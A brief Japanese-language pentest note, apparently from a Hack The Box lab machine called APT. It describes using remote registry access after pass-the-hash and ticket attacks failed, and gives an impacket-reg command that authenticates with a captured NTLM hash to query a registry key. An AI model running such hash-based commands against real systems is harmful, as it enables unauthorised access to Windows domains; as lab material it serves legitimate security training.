# Remote registry manipulation tool.

APTやったときに、ハッシュが分かってるのに、pass the hashもpass the ticketもgolden ticketもover pass the hashも出来なかったとき、このリモート
レジストリが希望となった。

Requirements:
- Domain
- Username
- Pssword or Hash
- Target IP address
- Registry key name

```
impacket-reg -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb -dc-ip apt 'htb.local/henry.vinson@apt' query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s
```
